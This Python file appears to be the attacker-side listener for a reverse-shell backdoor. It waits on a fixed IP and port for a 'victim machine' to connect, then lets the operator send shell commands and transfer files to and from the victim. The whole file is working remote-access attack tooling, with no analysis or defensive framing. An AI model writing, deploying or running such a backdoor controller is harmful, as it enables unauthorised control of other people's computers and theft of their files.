
import os
import socket
import json

SERVER_IP = '192.168.0.103'  # IP of server
SERVER_PORT = 5555


# Function to send data reliably
def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


# Function to receive data reliably
def reliable_recv():
    data = ''
    while True:
        try:
            data += target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# Function to download a file from the victim machine
def download_file(filename):
    with open(filename, 'wb') as file:
        target_sock.settimeout(1)
        try:
            chunk = target_sock.recv(1024)
            while chunk:
                file.write(chunk)
                chunk = target_sock.recv(1024)
        except socket.timeout:
            pass
        target_sock.settimeout(None)


# Function to upload a file to the victim machine
# def upload_file(filename):
#     with open(filename, 'rb') as file:
#         target_sock.send(file.read())


def upload_file(filename):
    with open(filename,"rb") as file:
        target_sock.send(file.read())


# Function for managing communication with the victim machine
def target_communication():
    while True:
        command = input(f'* Shell~{str(target_ip)}: ')  # Input command from attacker
        reliable_send(command)  # Send command to victim machine

        if command == 'quit':  # Exit condition
            break
        elif command[:3] == 'cd ':
            pass  # Directory change (no action needed here)
        elif command == 'clear':  # Clear terminal screen
            os.system('clear')
        elif command[:9] == 'download ':
            download_file(command[9:])  # Handle file download
        elif command[:7] == 'upload ':
            upload_file(command[7:])  # Handle file upload
        else:
            result = reliable_recv()  # Receive and print the result of command execution
            print(result)


# Setting up the server
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))
server_sock.listen(5)

print('[+] Listening for incoming connections...')
target_sock, target_ip = server_sock.accept()
print(f'[+] Backdoor connected from: {str(target_ip)}')

# Start communication with the victim
target_communication()

